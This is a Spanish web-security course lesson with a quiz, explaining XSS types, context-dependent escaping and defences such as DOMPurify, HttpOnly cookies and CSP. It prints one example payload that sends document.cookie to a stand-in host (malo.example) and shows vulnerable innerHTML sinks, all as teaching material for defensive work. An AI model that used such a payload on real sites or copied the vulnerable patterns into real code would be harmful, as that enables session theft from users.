---
title: "XSS: cuando el navegador ejecuta lo que no debe"
module: "Fundamentos de seguridad web"
order: 3
duration: "20 min"
access: "pro"
description: "Los tres tipos de XSS, por qué escapar a mano falla, y cómo el contexto de salida decide la defensa correcta."
quiz:
  - q: "¿Cuál es la esencia de un XSS?"
    options:
      - "Un fallo del navegador que hay que parchear"
      - "Datos del usuario que terminan interpretados como código en el navegador de otra persona"
      - "Un ataque a la base de datos"
      - "Un problema exclusivo de sitios sin HTTPS"
    answer: 1
    explain: "Es la misma raíz que la inyección SQL — mezclar datos con instrucciones — pero el intérprete es el navegador."
  - q: "En React, ¿qué línea introduce el riesgo de XSS?"
    options:
      - "<p>{comentario}</p>"
      - "<div dangerouslySetInnerHTML={{ __html: comentario }} />"
      - "<input value={comentario} />"
      - "Ninguna: React es inmune"
    answer: 1
    explain: "React escapa por defecto al interpolar; `dangerouslySetInnerHTML` desactiva esa protección a propósito."
  - q: "¿Qué hace que una cookie de sesión NO sea robable por un XSS?"
    options:
      - "El atributo Secure"
      - "El atributo HttpOnly"
      - "El atributo SameSite"
      - "Cifrar su contenido"
    answer: 1
    explain: "HttpOnly la oculta a JavaScript. Secure exige HTTPS y SameSite frena el CSRF: cada uno resuelve un problema distinto."
  - q: "¿Por qué un XSS almacenado es más grave que uno reflejado?"
    options:
      - "Porque es más difícil de detectar por el antivirus"
      - "Porque se guarda en el servidor y ataca a cada visitante, sin necesidad de engañar a nadie con un enlace"
      - "Porque solo afecta a los administradores"
      - "Porque no se puede arreglar"
    answer: 1
    explain: "El reflejado necesita que la víctima abra un enlace preparado; el almacenado dispara solo, a todo el que pase por ahí."
---

Si entendiste la lección anterior, esta ya la tienes medio ganada: **XSS es la misma enfermedad que la inyección SQL, con otro intérprete**. Allí el que se tragaba nuestros datos como si fueran instrucciones era el motor SQL. Aquí es el **navegador de otra persona**.

Y esa diferencia — *de otra persona* — es lo que lo vuelve peligroso. Un XSS no te ataca a ti: convierte tu sitio en el arma que ataca a tus usuarios.

## El pecado, otra vez

```jsx
// Panel de comentarios. `comentario` viene de un usuario cualquiera.
<div dangerouslySetInnerHTML={{ __html: comentario }} />
```

Alguien publica esto como comentario:

```html
<img src=x onerror="fetch('https://malo.example/r?c='+document.cookie)">
```

La imagen falla (obvio: `src=x` no existe), salta `onerror`, y **en el navegador de cada visitante** se ejecuta JavaScript escrito por el atacante — con la sesión de esa víctima. Sesiones robadas, acciones hechas en su nombre, formularios falsos dentro de tu propio dominio.

El nombre `dangerouslySetInnerHTML` no es decorativo. React lo llamó así precisamente para que dudes al escribirlo.

## Los tres tipos

| Tipo | Dónde vive el payload | Por qué importa |
|---|---|---|
| **Almacenado** | En tu base de datos (un comentario, un perfil, un nombre) | El más grave: ataca a todo visitante, sin engañar a nadie |
| **Reflejado** | En la URL, devuelto en la respuesta | Necesita que la víctima abra un enlace preparado (phishing) |
| **DOM-based** | Nunca llega al servidor: lo mete JS en el DOM | El backend está limpio; el bug es 100% del frontend |

El DOM-based es el que más se escapa en las auditorías: como el payload viaja tras el `#`, **ni siquiera llega al servidor**, así que ningún log ni WAF lo ve.

```js
// DOM-based clásico
document.getElementById('saludo').innerHTML = location.hash.slice(1);
```

## El contexto decide la defensa

Aquí está el criterio que separa a quien copia soluciones de quien entiende el problema: **no existe "escapar" a secas**. Escapar depende de *dónde* aterriza el dato.

```html
<p>AQUÍ</p>                      <!-- contexto HTML  → escapar < > & " ' -->
<input value="AQUÍ">             <!-- atributo       → además, comillas obligatorias -->
<script>var x = "AQUÍ";</script> <!-- contexto JS    → escapar como literal JS -->
<a href="AQUÍ">                  <!-- URL            → validar el esquema (¡ojo javascript:!) -->
```

El mismo dato, cuatro reglas distintas. Por eso **escapar a mano falla siempre a la larga**: tarde o temprano alguien mueve un valor de un contexto a otro y la protección deja de corresponder.

## Lo que sí funciona

**1. Interpolar, no inyectar.** El framework moderno escapa por ti *si le dejas*:

```jsx
<p>{comentario}</p>   // React escapa. Seguro.
```

**2. Si necesitas HTML de verdad, sanitiza con una librería.** Nunca con una expresión regular propia — llevas las de perder contra una lista infinita de variantes.

```jsx
import DOMPurify from 'dompurify';
<div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(comentario) }} />
```

**3. Cookies de sesión `HttpOnly`.** Si el token no es visible para JavaScript, un XSS ya no puede robarlo. No evita el XSS: **le quita el premio mayor**.

```
Set-Cookie: session=…; HttpOnly; Secure; SameSite=Lax; Path=/
```

**4. Content-Security-Policy.** La última línea: aunque el payload entre, el navegador se niega a ejecutar scripts que no vengan de un origen permitido.

```
Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none'; base-uri 'self'
```

Esto es exactamente lo que **Sentra revisa en un escaneo pasivo**: si tu sitio manda CSP, si tus cookies llevan `HttpOnly` y `Secure`. No son adornos — son la diferencia entre un XSS que roba sesiones y uno que se queda en nada.

## Lo que te llevas

- XSS = **datos convertidos en código**, ejecutados en el navegador de tu usuario.
- **El contexto de salida decide la defensa**: HTML, atributo, JS y URL no se escapan igual.
- Interpola con el framework; si necesitas HTML, **sanitiza con librería**, jamás con regex.
- Defensa en profundidad: `HttpOnly` + `SameSite` + **CSP** reducen el daño aunque algo se cuele.

En la siguiente lección atacamos la puerta de entrada: **autenticación y sesiones** — dónde se rompen los logins de verdad.
